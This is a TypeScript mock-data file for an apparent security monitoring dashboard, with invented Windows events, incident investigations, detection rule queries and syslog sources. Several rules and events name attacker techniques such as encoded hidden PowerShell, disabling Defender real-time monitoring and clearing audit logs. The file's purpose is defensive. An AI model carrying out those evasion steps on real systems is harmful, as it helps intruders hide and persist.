    },
    riskIndicators: [
      'In-memory binary reflection loaded via PowerShell',
    ],
    relatedEventIds: [],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell"/>
    <EventID>4104</EventID>
    <TimeCreated SystemTime="2026-09-02T10:28:44.0000000Z"/>
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>APP-17.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="ScriptBlockText">[Reflection.Assembly]::Load(...)</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 4104,
      scriptBlock: "[Reflection.Assembly]::Load(...)",
      user: "CORP\\dev_user"
    }, null, 2),
    mitreAttack: {
      tactic: 'Defense Evasion',
      technique: 'Reflective Code Loading',
      id: 'T1620'
    }
  },
  {
    id: 'evt-1102-audit',
    timestamp: '2026-09-02 10:14:02 UTC',
    severity: 'High',
    host: 'DC-01',
    channel: 'Security',
    channelFull: 'Security',
    eventId: 1102,
    provider: 'Microsoft-Windows-Eventlog',
    user: 'CORP\\krbtgt_adm',
    sourceIp: '10.20.1.10',
    summary: 'The audit log was cleared',
    details: {
      'SubjectUserName': 'krbtgt_adm',
      'SubjectDomainName': 'CORP',
      'LogName': 'Security',
    },
    riskIndicators: [
      'Security event log forcibly cleared by administrative token',
    ],
    relatedEventIds: [],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Eventlog"/>
    <EventID>1102</EventID>
    <TimeCreated SystemTime="2026-09-02T10:14:02.0000000Z"/>
    <Channel>Security</Channel>
    <Computer>DC-01.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="SubjectUserName">krbtgt_adm</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 1102,
      action: "Audit log cleared",
      user: "CORP\\krbtgt_adm"
    }, null, 2),
    mitreAttack: {
      tactic: 'Defense Evasion',
      technique: 'Indicator Removal: Clear Windows Event Logs',
      id: 'T1070.001'
    }
  },
  {
    id: 'evt-4625-fail',
    timestamp: '2026-09-02 10:09:55 UTC',
    severity: 'Low',
    host: 'BASTION-JUMP-01',
    channel: 'Security',
    channelFull: 'Security',
    eventId: 4625,
    provider: 'Microsoft-Windows-Security-Auditing',
    user: 'CORP\\guest',
    sourceIp: '198.51.100.42',
    summary: 'An account failed to log on: Unknown user name or bad password (Status 0xC000006D)',
    details: {
      'TargetUserName': 'guest',
      'Status': '0xC000006D',
      'SubStatus': '0xC0000064',
      'LogonType': '3',
      'IpAddress': '198.51.100.42',
    },
    riskIndicators: [
      'Failed logon attempt on internet-facing perimeter jump box',
    ],
    relatedEventIds: [],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Security-Auditing"/>
    <EventID>4625</EventID>
    <TimeCreated SystemTime="2026-09-02T10:09:55.0000000Z"/>
    <Channel>Security</Channel>
    <Computer>BASTION-JUMP-01.corp.internal</Computer>
  </System>
  <EventData>
    <Data Name="TargetUserName">guest</Data>
    <Data Name="Status">0xC000006D</Data>
    <Data Name="IpAddress">198.51.100.42</Data>
  </EventData>
</Event>`,
    rawJson: JSON.stringify({
      eventId: 4625,
      targetUser: "guest",
      failureReason: "Bad credentials",
      sourceIp: "198.51.100.42"
    }, null, 2),
    mitreAttack: {
      tactic: 'Credential Access',
      technique: 'Brute Force: Password Guessing',
      id: 'T1110.001'
    }
  },
  {
    id: 'evt-7036-svc',
    timestamp: '2026-09-02 10:02:18 UTC',
    severity: 'Informational',
    host: 'SERVER-01',
    channel: 'System',
    channelFull: 'System',
    eventId: 7036,
    provider: 'Service Control Manager',
    user: 'SYSTEM',
    sourceIp: '10.20.4.11',
    summary: 'The Windows Time service entered the running state.',
    details: {
      'param1': 'Windows Time',
      'param2': 'running',
    },
    riskIndicators: [],
    relatedEventIds: [],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>7036</EventID><Channel>System</Channel></System></Event>`,
    rawJson: JSON.stringify({ eventId: 7036, service: "Windows Time", state: "running" }),
  },
  {
    id: 'evt-4624-normal',
    timestamp: '2026-09-02 09:58:30 UTC',
    severity: 'Informational',
    host: 'SERVER-02',
    channel: 'Security',
    channelFull: 'Security',
    eventId: 4624,
    provider: 'Microsoft-Windows-Security-Auditing',
    user: 'CORP\\svc_monitor',
    sourceIp: '10.20.0.8',
    summary: 'An account was successfully logged on (Logon Type 3 / Network)',
    details: {
      'TargetUserName': 'svc_monitor',
      'LogonType': '3',
      'IpAddress': '10.20.0.8',
    },
    riskIndicators: [],
    relatedEventIds: [],
    rawXml: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>4624</EventID><Channel>Security</Channel></System></Event>`,
    rawJson: JSON.stringify({ eventId: 4624, user: "CORP\\svc_monitor", logonType: 3 }),
  },
];

// Flagship Investigation Workspace Data
export const MOCK_INVESTIGATIONS: Investigation[] = [
  {
    id: 'INV-000142',
    title: 'Suspicious Service Installation',
    host: 'SERVER-42',
    severity: 'High',
    confidence: 87,
    status: 'Open',
    createdAt: '2026-09-02 10:42:17 UTC',
    updatedAt: '2026-09-02 10:46:20 UTC',
    assignedTo: 'SOC Senior Analyst (Alex Vance)',
    description: 'Suspicious service registration (UpdaterSvc) pointing to an executable in C:\\Users\\Public\\updater.exe immediately following a privileged RDP session from pivot IP 192.168.40.88 and encoded PowerShell execution.',
    aiAssistantAssessment: {
      summary: 'The activity on SERVER-42 shows a suspicious sequence beginning with an RDP login followed by privileged access, PowerShell execution, service creation, and a Defender configuration change.',
      confidence: 87,
      findings: [
        {
          id: 'f-1',
          text: 'Privileged RDP session preceded service creation.',
          evidenceId: 'EVID-001',
          severity: 'Medium',
        },
        {
          id: 'f-2',
          text: 'Service executable is located in a user-writable directory (C:\\Users\\Public).',
          evidenceId: 'EVID-004',
          severity: 'Critical',
        },
        {
          id: 'f-3',
          text: 'Executable has no trusted publisher signature and spawned an encoded web download cradle.',
          evidenceId: 'EVID-003',
          severity: 'High',
        },
        {
          id: 'f-4',
          text: 'Defender configuration changed shortly afterward to disable real-time protection.',
          evidenceId: 'EVID-005',
          severity: 'Critical',
        },
      ],
    },
    timeline: [
      {
        time: '10:41:03',
        timestamp: '2026-09-02 10:41:03 UTC',
        label: 'RDP Login',
        eventId: 4624,
        eventRecordId: 'evt-4624-rdp',
        severity: 'Medium',
        detail: 'Logon Type 10 from 192.168.40.88 with account CORP\\admin',
        evidenceId: 'EVID-001',
      },
      {
        time: '10:41:07',
        timestamp: '2026-09-02 10:41:07 UTC',
        label: 'Privileged Token',
        eventId: 4672,
        eventRecordId: 'evt-4672-priv',
        severity: 'High',
        detail: 'SeDebugPrivilege and SeTcbPrivilege elevated rights granted',
        evidenceId: 'EVID-002',
      },
      {
        time: '10:42:11',
        timestamp: '2026-09-02 10:42:11 UTC',
        label: 'PowerShell Started',
        eventId: 4688,
        eventRecordId: 'evt-4688-ps',
        severity: 'High',
        detail: 'Hidden window PowerShell executed encoded payload cradle',
        evidenceId: 'EVID-003',
      },
      {
        time: '10:42:17',
        timestamp: '2026-09-02 10:42:17 UTC',
        label: 'New Service',
        eventId: 7045,
        eventRecordId: 'evt-7045-svc',
        severity: 'Critical',
        detail: 'Service "UpdaterSvc" installed pointing to C:\\Users\\Public\\updater.exe',
        evidenceId: 'EVID-004',
      },
      {
        time: '10:42:23',
        timestamp: '2026-09-02 10:42:23 UTC',
        label: 'Defender Configuration Changed',
        eventId: 5007,
        eventRecordId: 'evt-5007-def',
        severity: 'Critical',
        detail: 'Real-time monitoring disabled and folder exclusion added',
        evidenceId: 'EVID-005',
      },
    ],
    evidenceIds: ['EVID-001', 'EVID-002', 'EVID-003', 'EVID-004', 'EVID-005'],
    notes: [
      {
        id: 'note-1',
        author: 'Alex Vance',
        role: 'SOC Senior Analyst',
        timestamp: '2026-09-02 10:44:00 UTC',
        text: 'Agent placed in high-verbosity Investigation Mode. Binary hash MD5: 4a8b... sent to sandbox analysis. Isolation recommended if C2 callback confirmed.',
      },
      {
        id: 'note-2',
        author: 'System Warden Core',
        role: 'Automated Orchestrator',
        timestamp: '2026-09-02 10:42:18 UTC',
        text: 'Telemetry capture rate dynamically elevated to 500ms sampling window for host SERVER-42.',
      },
    ],
    graphData: {
      nodes: [
        { id: 'n-user', label: 'DOMAIN\\admin', type: 'user', subtext: 'User Token (Elevated)' },
        { id: 'n-host', label: 'SERVER-42', type: 'host', subtext: 'Windows Server 2022' },
        { id: 'n-ps', label: 'PowerShell.exe', type: 'process', subtext: 'PID: 4892 (-Enc)' },
        { id: 'n-svc', label: 'UpdaterSvc', type: 'service', subtext: 'Auto Start (LocalSystem)' },
        { id: 'n-bin', label: 'updater.exe', type: 'file', subtext: 'C:\\Users\\Public\\updater.exe' },
        { id: 'n-def', label: 'Defender', type: 'event', subtext: 'Protection Disabled' },
      ],
      edges: [
        { from: 'n-user', to: 'n-host', label: 'RDP Logged In' },
        { from: 'n-user', to: 'n-ps', label: 'Spawned' },
        { from: 'n-ps', to: 'n-svc', label: 'Created Service' },
        { from: 'n-svc', to: 'n-bin', label: 'Executes Binary' },
        { from: 'n-bin', to: 'n-def', label: 'Tampered Config' },
      ],
    },
  },
  {
    id: 'INV-000141',
    title: 'Unusual Privileged Login',
    host: 'DC-02',
    severity: 'High',
    confidence: 82,
    status: 'Investigating',
    createdAt: '2026-09-02 10:35:12 UTC',
    updatedAt: '2026-09-02 10:40:00 UTC',
    assignedTo: 'Lead IR (Elena Rostova)',
    description: 'Backup service account created a local administrator account on Domain Controller DC-02 outside the maintenance schedule.',
    aiAssistantAssessment: {
      summary: 'Service account CORP\\svc_backup created an interactive domain account (ghost_admin) and attempted group membership modification.',
      confidence: 82,
      findings: [
        {
          id: 'f-1',
          text: 'Non-human service account executed interactive account creation event (4720).',
          evidenceId: 'EVID-001',
          severity: 'High',
        },
      ],
    },
    timeline: [
      {
        time: '10:35:12',
        timestamp: '2026-09-02 10:35:12 UTC',
        label: 'Account Created',
        eventId: 4720,
        eventRecordId: 'evt-4720-user',
        severity: 'High',
        detail: 'ghost_admin created by svc_backup',
      },
    ],
    evidenceIds: ['EVID-001'],
    notes: [],
    graphData: {
      nodes: [
        { id: 'n-svc-acc', label: 'CORP\\svc_backup', type: 'user' },
        { id: 'n-dc', label: 'DC-02', type: 'host' },
        { id: 'n-new-acc', label: 'ghost_admin', type: 'user' },
      ],
      edges: [
        { from: 'n-svc-acc', to: 'n-dc', label: 'Authenticated' },
        { from: 'n-svc-acc', to: 'n-new-acc', label: 'Created Account' },
      ],
    },
  },
  {
    id: 'INV-000140',
    title: 'PowerShell Execution Anomaly',
    host: 'APP-17',
    severity: 'Medium',
    confidence: 76,
    status: 'Open',
    createdAt: '2026-09-02 10:28:44 UTC',
    updatedAt: '2026-09-02 10:31:00 UTC',
    assignedTo: 'Unassigned',
    description: 'Suspicious script block logging detected in-memory reflection DLL load pattern inside developer application node.',
    aiAssistantAssessment: {
      summary: 'Dynamic script execution evaluated binary header signature (MZ header) inside byte array reflection call.',
      confidence: 76,
      findings: [
        {
          id: 'f-1',
          text: 'ScriptBlock payload loaded dynamic assembly from base64 string.',
          evidenceId: 'EVID-003',
          severity: 'Medium',
        },
      ],
    },
    timeline: [
      {
        time: '10:28:44',
        timestamp: '2026-09-02 10:28:44 UTC',
        label: 'Script Block Logged',
        eventId: 4104,
        eventRecordId: 'evt-4104-ps',
        severity: 'Medium',
        detail: 'Reflection assembly load detected',
      },
    ],
    evidenceIds: [],
    notes: [],
    graphData: {
      nodes: [
        { id: 'n-app', label: 'APP-17', type: 'host' },
        { id: 'n-ps', label: 'powershell.exe', type: 'process' },
      ],
      edges: [
        { from: 'n-app', to: 'n-ps', label: 'Executed' },
      ],
    },
  },
  {
    id: 'INV-000139',
    title: 'Audit Log Clearing on Primary DC',
    host: 'DC-01',
    severity: 'High',
    confidence: 94,
    status: 'Resolved',
    createdAt: '2026-09-02 10:14:02 UTC',
    updatedAt: '2026-09-02 10:30:00 UTC',
    assignedTo: 'Alex Vance',
    description: 'Security event log was cleared by krbtgt_adm during routine scheduled backup cycle script validation.',
    aiAssistantAssessment: {
      summary: 'Log clearing matched verified change request RFC-9921 for database partition compaction.',
      confidence: 94,
      findings: [],
    },
    timeline: [],
    evidenceIds: [],
    notes: [
      {
        id: 'n-res',
        author: 'Alex Vance',
        role: 'SOC Senior Analyst',
        timestamp: '2026-09-02 10:30:00 UTC',
        text: 'Confirmed legitimate change request RFC-9921. Incident marked resolved.',
      },
    ],
    graphData: { nodes: [], edges: [] },
  },
  {
    id: 'INV-000138',
    title: 'Perimeter Brute Force Burst',
    host: 'BASTION-JUMP-01',
    severity: 'Medium',
    confidence: 88,
    status: 'Closed',
    createdAt: '2026-09-02 09:40:00 UTC',
    updatedAt: '2026-09-02 10:10:00 UTC',
    assignedTo: 'Automated Response',
    description: 'Over 140 failed logon events recorded within 60 seconds from external IP 198.51.100.42.',
    aiAssistantAssessment: {
      summary: 'Perimeter firewall ACL auto-dropped offending subnet.',
      confidence: 88,
      findings: [],
    },
    timeline: [],
    evidenceIds: [],
    notes: [],
    graphData: { nodes: [], edges: [] },
  },
];

// Detections Engine Catalog
export const MOCK_DETECTIONS: Detection[] = [
  {
    id: 'det-001',
    name: 'Suspicious Service Installation',
    description: 'Detects the creation of a new Windows service where the binary path points to user-writable directories or temporary folders.',
    severity: 'High',
    confidence: 87,
    triggersCount: 14,
    hostsImpacted: ['SERVER-42', 'SERVER-01'],
    lastTriggered: '4 min ago',
    status: 'Active',
    ruleQuery: `event.code: 7045 AND (
  winlog.event_data.ImagePath: (*\\Users\\Public\\* OR *\\AppData\\Local\\Temp\\* OR *\\Windows\\Temp\\*)
)`,
    mitreAttack: {
      id: 'T1543.003',
      name: 'Windows Service',
      tactic: 'Persistence',
    },
    evidenceTemplate: 'Inspect binary digital signature and parent process tree in Process Explorer.',
    recentMatchEventIds: ['evt-7045-svc'],
  },
  {
    id: 'det-002',
    name: 'Encoded PowerShell Execution',
    description: 'Identifies PowerShell processes spawned with hidden execution parameters and base64 encoded command arguments.',
    severity: 'High',
    confidence: 82,
    triggersCount: 38,
    hostsImpacted: ['SERVER-42', 'APP-17', 'WS-ENG-88'],
    lastTriggered: '7 min ago',
    status: 'Active',
    ruleQuery: `event.code: 4688 AND process.name: "powershell.exe" AND (
  process.command_line: (*-Enc* OR *-EncodedCommand* OR *-W Hidden* OR *-NoProfile*)
)`,
    mitreAttack: {
      id: 'T1059.001',
      name: 'PowerShell',
      tactic: 'Execution',
    },
    evidenceTemplate: 'Extract Base64 command buffer and inspect for download cradles.',
    recentMatchEventIds: ['evt-4688-ps', 'evt-4104-ps'],
  },
  {
    id: 'det-003',
    name: 'Unusual Privileged Login',
    description: 'Flags successful logon events (4624) where high privilege tokens are granted outside of registered administrative bastions.',
    severity: 'Medium',
    confidence: 71,
    triggersCount: 92,
    hostsImpacted: ['DC-02', 'SERVER-42', 'DC-01'],
    lastTriggered: '11 min ago',
    status: 'Active',
    ruleQuery: `event.code: 4624 AND winlog.event_data.LogonType: (10 OR 2) AND NOT source.ip: ("10.20.0.5" OR "10.20.0.6")`,
    mitreAttack: {
      id: 'T1078.002',
      name: 'Domain Accounts',
      tactic: 'Initial Access',
    },
    evidenceTemplate: 'Correlate with PAM ticket authorization and physical badge access.',
    recentMatchEventIds: ['evt-4624-rdp', 'evt-4672-priv'],
  },
  {
    id: 'det-004',
    name: 'New Local Administrator Created',
    description: 'Detects local user account creation or modification events adding accounts to local or domain Administrator groups.',
    severity: 'High',
    confidence: 91,
    triggersCount: 5,
    hostsImpacted: ['DC-02', 'NODE-004'],
    lastTriggered: '14 min ago',
    status: 'Active',
    ruleQuery: `event.code: (4720 OR 4728 OR 4732) AND winlog.event_data.TargetSid: "S-1-5-32-544"`,
    mitreAttack: {
      id: 'T1136.001',
      name: 'Local Account',
      tactic: 'Persistence',
    },
    evidenceTemplate: 'Verify identity ticket authorization in IAM change control system.',
    recentMatchEventIds: ['evt-4720-user'],
  },
  {
    id: 'det-005',
    name: 'Defender Antivirus Real-Time Monitoring Disabled',
    description: 'Detects Windows Defender operational events where real-time protection, script scanning, or behavior monitoring is turned off.',
    severity: 'Critical',
    confidence: 96,
    triggersCount: 2,
    hostsImpacted: ['SERVER-42'],
    lastTriggered: '4 min ago',
    status: 'Active',
    ruleQuery: `event.code: 5007 AND winlog.event_data.NewValue: (*DisableRealtimeMonitoring=1* OR *DisableBehaviorMonitoring=1*)`,
    mitreAttack: {
      id: 'T1562.001',
      name: 'Disable or Modify Tools',
      tactic: 'Defense Evasion',
    },
    evidenceTemplate: 'Immediate endpoint containment and malware eradication workflow.',
    recentMatchEventIds: ['evt-5007-def'],
  },
  {
    id: 'det-006',
    name: 'Security Event Log Cleared',
    description: 'Alerts when an administrator or service account executes the EventLog clear command on Windows security channels.',
    severity: 'Critical',
    confidence: 98,
    triggersCount: 3,
    hostsImpacted: ['DC-01'],
    lastTriggered: '35 min ago',
    status: 'Active',
    ruleQuery: `event.code: 1102 OR event.code: 104`,
    mitreAttack: {
      id: 'T1070.001',
      name: 'Clear Windows Event Logs',
      tactic: 'Defense Evasion',
    },
    evidenceTemplate: 'Verify with SIEM historical replica to identify removed log spans.',
    recentMatchEventIds: ['evt-1102-audit'],
  },
];

// Collection Profiles
export const MOCK_COLLECTION_PROFILES: CollectionProfile[] = [
  {
    id: 'profile-baseline',
    name: 'Windows Server Baseline',
    version: '1.4',
    status: 'Active',
    mode: 'Standard',
    coveragePercent: '78%',
    estimatedVolumeDaily: '1.8 GB/day',
    estimatedEventsPerDay: '1.2M events/day',
    estimatedBandwidth: '180 Kbps',
    estimatedEndpointCpu: '0.4%',
    purpose: 'Continuous baseline security telemetry across standard Windows member servers and virtual machines.',
    channels: ['Security', 'System', 'Application', 'Defender'],
    categories: [
      { name: 'Authentication & Logons', enabled: true, eventIds: [4624, 4625, 4634, 4672], description: 'Logon sessions, elevated tokens, and authentication failures' },
      { name: 'Account Management', enabled: true, eventIds: [4720, 4722, 4728, 4732, 4738], description: 'User creations, group changes, and password resets' },
      { name: 'Process Creation', enabled: true, eventIds: [4688], description: 'Process launch telemetry with command line arguments' },
      { name: 'Service Changes', enabled: true, eventIds: [7036, 7045], description: 'Service installation and state changes' },
      { name: 'Defender & Antivirus', enabled: true, eventIds: [1116, 1117, 5007], description: 'Threat detections and security engine alterations' },
      { name: 'PowerShell Deep Scripting', enabled: false, eventIds: [4104, 4103], description: 'Detailed script block and pipeline execution logging' },
    ],
    deploymentCoverage: {
      totalHosts: 184,
      activeHosts: 144,
      percent: 78,
    },
    versionHistory: [
      { version: '1.4', date: '2026-08-15', author: 'SOC Lead (Marcus K.)', comment: 'Added Event ID 5007 for Defender tampering detection' },
      { version: '1.3', date: '2026-05-20', author: 'Alex Vance', comment: 'Enabled command-line capture in Event ID 4688' },
      { version: '1.0', date: '2026-01-10', author: 'System Admin', comment: 'Initial baseline profile creation' },
    ],
  },
  {
    id: 'profile-dc',
    name: 'Domain Controller',
    version: '2.1',
    status: 'Active',
    mode: 'Standard',
    coveragePercent: '91%',
    estimatedVolumeDaily: '3.4 GB/day',
    estimatedEventsPerDay: '3.8M events/day',
    estimatedBandwidth: '340 Kbps',
    estimatedEndpointCpu: '0.8%',
    purpose: 'High-fidelity directory services telemetry for Active Directory Domain Controllers and KDCs.',
    channels: ['Security', 'System', 'Directory Service', 'DNS Server', 'Defender', 'PowerShell'],
    categories: [
      { name: 'Kerberos & Ticket Granting', enabled: true, eventIds: [4768, 4769, 4771], description: 'TGT requests, service tickets, and pre-auth failures' },
      { name: 'Directory Object Changes', enabled: true, eventIds: [5136, 5137, 5141], description: 'Granular modifications to AD schema and sensitive OUs' },
      { name: 'Authentication & Logons', enabled: true, eventIds: [4624, 4625, 4672], description: 'DC authentication audits' },
      { name: 'Account Management', enabled: true, eventIds: [4720, 4726, 4728, 4738], description: 'Privileged group modifications' },
      { name: 'Audit Log Tampering', enabled: true, eventIds: [1102, 104], description: 'Log clearing attempts' },
      { name: 'PowerShell Deep Scripting', enabled: true, eventIds: [4104], description: 'Administrative script block telemetry' },
    ],
    deploymentCoverage: {
      totalHosts: 184,
      activeHosts: 8,
      percent: 91,
    },
    versionHistory: [
      { version: '2.1', date: '2026-07-02', author: 'Elena Rostova', comment: 'Added Kerberos TGS roasting detection events' },
    ],
  },
  {
    id: 'profile-ps',
    name: 'PowerShell Investigation',
    version: '1.2',
    status: 'Active',
    mode: 'Investigation',
    coveragePercent: 'High',
    estimatedVolumeDaily: '2.2 GB/day',
    estimatedEventsPerDay: '2.4M events/day',
    estimatedBandwidth: '220 Kbps',
    estimatedEndpointCpu: '0.6%',
    purpose: 'Comprehensive script block and AST logging for systems exhibiting script-based anomalies.',
    channels: ['Microsoft-Windows-PowerShell/Operational', 'Security', 'System'],
    categories: [
      { name: 'PowerShell Script Blocks', enabled: true, eventIds: [4104], description: 'Full decompiled script block logging with signatures' },
      { name: 'PowerShell Pipeline Execution', enabled: true, eventIds: [4103], description: 'Command invocation and parameter logging' },
      { name: 'Process Creation', enabled: true, eventIds: [4688], description: 'Parent-child process tracking' },
    ],
    deploymentCoverage: {
      totalHosts: 184,
      activeHosts: 12,
      percent: 100,
    },
    versionHistory: [
      { version: '1.2', date: '2026-06-11', author: 'Alex Vance', comment: 'Enhanced module invocation filters' },
    ],
  },
  {
    id: 'profile-rdp',
    name: 'RDP Investigation',
    version: '1.0',
    status: 'Active',
    mode: 'Investigation',
    coveragePercent: 'High',
    estimatedVolumeDaily: '1.5 GB/day',
    estimatedEventsPerDay: '1.1M events/day',
    estimatedBandwidth: '150 Kbps',
    estimatedEndpointCpu: '0.3%',
    purpose: 'Deep remote desktop session, channel, and virtual channel telemetry for perimeter jump boxes.',
    channels: ['Security', 'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational', 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational'],
    categories: [
      { name: 'RDP Session Lifecycle', enabled: true, eventIds: [21, 22, 24, 25], description: 'Session connect, disconnect, reconnect, and shell start' },
      { name: 'Network Logons', enabled: true, eventIds: [4624, 4625], description: 'Type 10 RDP logons and source IP binding' },
    ],
    deploymentCoverage: {
      totalHosts: 184,
      activeHosts: 4,
      percent: 100,
    },
    versionHistory: [
      { version: '1.0', date: '2026-03-01', author: 'Marcus K.', comment: 'Initial RDP specialized profile' },
    ],
  },
  {
    id: 'profile-investigation',
    name: 'Incident Response / Investigation',
    version: '2.0',
    status: 'Active',
    mode: 'Temporary',
    coveragePercent: 'Maximum',
    estimatedVolumeDaily: '5.2 GB/day',
    estimatedEventsPerDay: '6.5M events/day',
    estimatedBandwidth: '520 Kbps',
    estimatedEndpointCpu: '1.2%',
    purpose: 'Maximum-fidelity telemetry capture activated during active breach response or forensic analysis.',
    channels: ['Security', 'System', 'Application', 'PowerShell', 'Defender', 'Sysmon', 'TaskScheduler'],
    categories: [
      { name: 'All Security Auditing', enabled: true, eventIds: [4624, 4672, 4688, 4720, 1102, 4697], description: 'Unthrottled audit events' },
      { name: 'Complete PowerShell Logging', enabled: true, eventIds: [4103, 4104], description: 'All script blocks and payloads' },
      { name: 'Service & Driver Installation', enabled: true, eventIds: [7045, 7036, 7040], description: 'All driver and service changes' },
      { name: 'Task Scheduler Operational', enabled: true, eventIds: [106, 140, 200], description: 'Scheduled task creation and trigger execution' },
    ],
    deploymentCoverage: {
      totalHosts: 184,
      activeHosts: 3,
      percent: 100,
    },
    versionHistory: [
      { version: '2.0', date: '2026-08-01', author: 'IR Lead (Elena Rostova)', comment: 'Added TaskScheduler and Sysmon compatibility' },
    ],
  },
];

// Syslog Ingestion Sources & Listeners
export const MOCK_SYSLOG_SOURCES: SyslogSource[] = [
  {
    id: 'sys-src-1',
    source: 'FW-HQ-01',
    type: 'Firewall',
    ip: '10.10.1.1',
    messagesPerSec: 842,
    status: 'Healthy',
    lastMessage: '2 sec ago',
    parser: 'Palo Alto PAN-OS Parser v2.3',
    todayCount: 4210490,
  },
  {
    id: 'sys-src-2',
    source: 'SW-CORE-01',
    type: 'Network Switch',
    ip: '10.10.1.10',
    messagesPerSec: 214,
    status: 'Healthy',
    lastMessage: '4 sec ago',
    parser: 'Cisco IOS Syslog Parser v1.8',
    todayCount: 1890200,
  },
  {
    id: 'sys-src-3',
    source: 'APP-LOG-01',
    type: 'Linux Server',
    ip: '10.10.2.21',
    messagesPerSec: 98,
    status: 'Healthy',
    lastMessage: '1 sec ago',
    parser: 'RFC 5424 Structured Parser',
    todayCount: 890400,
  },
  {
    id: 'sys-src-4',
    source: 'VPN-GW-02',
    type: 'VPN Gateway',
    ip: '10.10.1.5',
    messagesPerSec: 165,
    status: 'Healthy',
    lastMessage: '3 sec ago',
    parser: 'Fortinet FortiOS Parser v2.1',
    todayCount: 1420100,
  },
  {
    id: 'sys-src-5',
    source: 'PROXY-EDGE-01',
    type: 'Proxy',
    ip: '10.10.1.20',
    messagesPerSec: 412,
    status: 'Healthy',
    lastMessage: '1 sec ago',
    parser: 'Squid / W3C Proxy Format',
    todayCount: 3910000,
  },
  {
    id: 'sys-src-6',
    source: 'SAN-STORAGE-01',
    type: 'Storage',
    ip: '10.10.4.50',
    messagesPerSec: 42,
    status: 'Warning',
    lastMessage: '18 sec ago',
    parser: 'NetApp ONTAP Syslog Parser',
    todayCount: 410200,
  },
];

export const MOCK_SYSLOG_LISTENERS: SyslogListener[] = [
  {
    id: 'lis-udp-514',
    protocol: 'UDP',
    port: 514,
    status: 'Active',
    messagesPerSec: 1840,
    connectedSources: 28,
    bufferSize: '512 MB (Ring Buffer)',
  },
  {
    id: 'lis-tcp-514',
    protocol: 'TCP',
    port: 514,
    status: 'Active',
    messagesPerSec: 1420,
    connectedSources: 14,
    bufferSize: '1.0 GB (Buffered)',
  },
  {
    id: 'lis-tls-6514',
    protocol: 'TCP TLS',
    port: 6514,
    status: 'Active',
    messagesPerSec: 561,
    connectedSources: 5,
    tlsCertExpiry: '2027-04-18 (Valid, CA: Warden Internal Root)',
    bufferSize: '512 MB (Encrypted)',
  },
];

export const MOCK_SYSLOG_MESSAGES: SyslogMessage[] = [
  {
    id: 'sys-msg-1',
    timestamp: '2026-09-02 10:49:12 UTC',
    facility: 'local0 (16)',
    severity: 'Medium',
    host: 'FW-HQ-01',
    appName: 'PAN-OS-TRAFFIC',
    procId: '1',
    msgId: 'TRAFFIC_DROP',
    rawMessage: '<134>1 2026-09-02T10:49:12Z FW-HQ-01 pan_agent - TRAFFIC_DROP - 1,2026/09/02 10:49:12,001801000284,TRAFFIC,drop,0,2026/09/02 10:49:12,192.168.40.88,10.20.4.42,0.0.0.0,0.0.0.0,Blocked-Inbound-Rules,corp\\admin,vsys1,untrust,trust,ethernet1/1,ethernet1/2,LogForwarder,2026/09/02 10:49:12,41829,1,52418,445,0,0,0x0,tcp,deny,64,64,0,1,10:49:12,0,any,0,0',
    parsedFields: {
      action: 'drop',
      srcIp: '192.168.40.88',
      dstIp: '10.20.4.42',
      srcPort: 52418,
      dstPort: 445,
      proto: 'tcp',
      rule: 'Blocked-Inbound-Rules',
    },
  },
  {
    id: 'sys-msg-2',
    timestamp: '2026-09-02 10:48:58 UTC',
    facility: 'authpriv (10)',
    severity: 'Informational',
    host: 'APP-LOG-01',
    appName: 'sshd',
    procId: '14820',
    msgId: 'AUTH_SUCCESS',
    rawMessage: '<86>1 2026-09-02T10:48:58Z APP-LOG-01 sshd 14820 AUTH_SUCCESS - Accepted publickey for ansible from 10.10.0.5 port 49120 ssh2: RSA SHA256:4a8b1c9...',
    parsedFields: {
      user: 'ansible',
      srcIp: '10.10.0.5',
      authMethod: 'publickey',
      port: 49120,
    },
  },
  {
    id: 'sys-msg-3',
    timestamp: '2026-09-02 10:48:40 UTC',
    facility: 'daemon (3)',
    severity: 'Low',
    host: 'SW-CORE-01',
    appName: 'SWITCH-MGR',
    procId: '0',
    msgId: 'LINK_UP',
    rawMessage: '<30>1 2026-09-02T10:48:40Z SW-CORE-01 switch 0 LINK_UP - %LINK-3-UPDOWN: Interface GigabitEthernet1/0/24, changed state to up',
    parsedFields: {
      interface: 'GigabitEthernet1/0/24',
      state: 'up',
    },
  },
];

// Integrations
export const MOCK_INTEGRATIONS: Integration[] = [
  {
    id: 'int-opensearch',
    name: 'OpenSearch Cluster',
    category: 'SIEM',
    status: 'Connected',
    lastDelivery: '2 sec ago',
    eventsSent: '184.2M events',
    description: 'High-throughput warm & hot storage index forwarding with automatic ILM policy.',
    endpoint: 'https://opensearch-cluster.internal.corp:9200',
    tlsEnabled: true,
    version: '2.14.0',
  },
  {
    id: 'int-elastic',
    name: 'Elasticsearch',
    category: 'SIEM',
    status: 'Not Connected',
    lastDelivery: 'Never',
    eventsSent: '0',
    description: 'Enterprise Search output for Elastic SIEM & Kibana dashboards.',
    endpoint: 'https://elastic.corp:9200',
    tlsEnabled: true,
    version: '8.12.0',
  },
  {
    id: 'int-splunk',
    name: 'Splunk HEC',
    category: 'SIEM',
    status: 'Connected',
    lastDelivery: '5 sec ago',
    eventsSent: '42.8M events',
    description: 'HTTP Event Collector token-based telemetry stream with custom sourcetype mapping.',
    endpoint: 'https://splunk-hec.corp:8088/services/collector',
    tlsEnabled: true,
    version: '9.1.2',
  },
  {
    id: 'int-sentinel',
    name: 'Microsoft Sentinel',
    category: 'SIEM',
    status: 'Not Connected',
    lastDelivery: 'Never',
    eventsSent: '0',
    description: 'Azure Log Analytics Workspace Data Collection Endpoint (DCE) ingestion.',
    endpoint: 'https://dce-warden-eastus.ingest.monitor.azure.com',
